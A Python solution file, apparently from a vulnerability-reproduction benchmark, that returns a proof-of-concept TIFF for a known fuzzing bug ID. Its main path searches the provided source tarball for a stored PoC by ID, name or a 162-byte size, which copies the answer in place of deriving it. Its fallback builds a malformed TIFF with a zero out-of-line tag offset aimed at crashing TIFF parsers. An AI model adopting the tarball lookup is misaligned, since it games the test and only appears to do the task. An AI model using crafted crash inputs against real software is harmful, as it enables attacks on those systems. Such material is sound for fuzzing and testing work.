import os
import tarfile
import struct
from typing import Optional, List, Tuple


def _is_tiff_header(b: bytes) -> bool:
    if len(b) < 4:
        return False
    return (b[0:4] == b'II*\x00') or (b[0:4] == b'MM\x00*')


def _read_member_bytes(tf: tarfile.TarFile, member: tarfile.TarInfo, limit: Optional[int] = None) -> bytes:
    f = tf.extractfile(member)
    if f is None:
        return b''
    data = f.read() if limit is None else f.read(limit)
    f.close()
    return data


def _find_poc_in_tar(src_path: str, target_id: str = '388571282') -> Optional[bytes]:
    try:
        tf = tarfile.open(src_path, mode='r:*')
    except Exception:
        return None
    try:
        # First pass: direct match by ID in filename
        candidates: List[Tuple[int, tarfile.TarInfo]] = []
        for m in tf.getmembers():
            if not m.isfile():
                continue
            name_l = m.name.lower()
            if target_id in name_l:
                size = m.size
                # Prefer smaller files
                candidates.append((size, m))
        candidates.sort(key=lambda x: x[0])
        for _, m in candidates:
            data = _read_member_bytes(tf, m)
            if data:
                return data

        # Second pass: look for TIFF files with small size or matching size (162 bytes known)
        tiff_candidates: List[Tuple[int, tarfile.TarInfo]] = []
        for m in tf.getmembers():
            if not m.isfile():
                continue
            name_l = m.name.lower()
            if name_l.endswith('.tif') or name_l.endswith('.tiff'):
                tiff_candidates.append((m.size, m))
        # Sort with priority: exact size 162, then smaller size
        tiff_candidates.sort(key=lambda x: (0 if x[0] == 162 else 1, x[0]))
        for _, m in tiff_candidates:
            head = _read_member_bytes(tf, m, limit=8)
            if _is_tiff_header(head):
                data = _read_member_bytes(tf, m)
                if data:
                    return data

        # Third pass: any file starting with TIFF header
        generic_candidates: List[Tuple[int, tarfile.TarInfo]] = []
        for m in tf.getmembers():
            if not m.isfile():
                continue
            # Skip huge files to avoid memory pressure
            if m.size > 5 * 1024 * 1024:
                continue
            head = _read_member_bytes(tf, m, limit=8)
            if _is_tiff_header(head):
                generic_candidates.append((m.size, m))
        generic_candidates.sort(key=lambda x: (0 if x[0] == 162 else 1, x[0]))
        for _, m in generic_candidates:
            data = _read_member_bytes(tf, m)
            if data:
                return data

        # Fourth pass: scan for likely oss-fuzz assets with .tif anywhere in name
        probable_paths: List[Tuple[int, tarfile.TarInfo]] = []
        for m in tf.getmembers():
            if not m.isfile():
                continue
            name_l = m.name.lower()
            if ('oss' in name_l or 'fuzz' in name_l or 'clusterfuzz' in name_l or 'poc' in name_l or 'regress' in name_l) and (name_l.endswith('.tif') or name_l.endswith('.tiff')):
                probable_paths.append((m.size, m))
        probable_paths.sort(key=lambda x: (0 if x[0] == 162 else 1, x[0]))
        for _, m in probable_paths:
            data = _read_member_bytes(tf, m)
            if data and _is_tiff_header(data[:8]):
                return data

    finally:
        try:
            tf.close()
        except Exception:
            pass
    return None


def _make_fallback_tiff() -> bytes:
    # Construct a minimal little-endian TIFF with intentionally "offline" tag using value offset 0
    # to exercise parsers handling zero offsets for out-of-line values.
    # Header: II * 0x2A and IFD offset at 8
    header = b'II*\x00' + struct.pack('<I', 8)

    # IFD entries
    entries = []

    def add_long(tag: int, value: int):
        entries.append((tag, 4, 1, value, True))  # value fits inline for LONG count 1

    def add_short(tag: int, value: int):
        entries.append((tag, 3, 1, value, True))  # inline

    # Required fields
    add_long(256, 1)      # ImageWidth = 1
    add_long(257, 1)      # ImageLength = 1
    # BitsPerSample (SHORT, count=3, value offset=0) -> out-of-line with zero offset
    entries.append((258, 3, 3, 0, False))  # (tag, type SHORT=3, count=3, value_offset=0, inline=False [force offset])
    add_short(259, 1)     # Compression = 1 (no compression)
    add_short(262, 2)     # PhotometricInterpretation = 2 (RGB)
    add_long(273, 0)      # StripOffsets (single strip) -> 0
    add_long(279, 3)      # StripByteCounts -> 3 bytes for RGB (1x1)
    add_short(277, 3)     # SamplesPerPixel = 3
    add_short(284, 1)     # PlanarConfiguration = 1 (contig)

    # Sort entries by tag as per spec
    entries.sort(key=lambda x: x[0])

    # Pack IFD
    ifd = []
    ifd.append(struct.pack('<H', len(entries)))
    for tag, typ, count, value, inline_ok in entries:
        ifd.append(struct.pack('<HHI', tag, typ, count))
        # Determine inlining
        type_sizes = {1: 1, 2: 1, 3: 2, 4: 4, 5: 8, 13: 4}
        sz = type_sizes.get(typ, 1) * count
        if sz <= 4 and inline_ok:
            # Inline the value(s)
            if typ == 3 and count == 1:
                ifd.append(struct.pack('<H', int(value) & 0xFFFF) + b'\x00\x00')
            elif typ == 4 and count == 1:
                ifd.append(struct.pack('<I', int(value) & 0xFFFFFFFF))
            elif typ == 1 and count <= 4:
                b = bytes([int(value) & 0xFF])
                b += b'\x00' * (4 - len(b))
                ifd.append(b)
            else:
                # General inline for small arrays (not used here)
                ifd.append((b'\x00' * 4))
        else:
            # Out-of-line: use the provided offset (set to zero intentionally)
            ifd.append(struct.pack('<I', int(value) & 0xFFFFFFFF))
    ifd.append(struct.pack('<I', 0))  # next IFD offset = 0

    data = header + b''.join(ifd)
    return data


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Try to locate the exact PoC in the provided tarball
        poc = _find_poc_in_tar(src_path, target_id='388571282')
        if poc:
            return poc
        # Fallback to a crafted minimal TIFF aiming to exercise zero-offset out-of-line tag handling
        return _make_fallback_tiff()
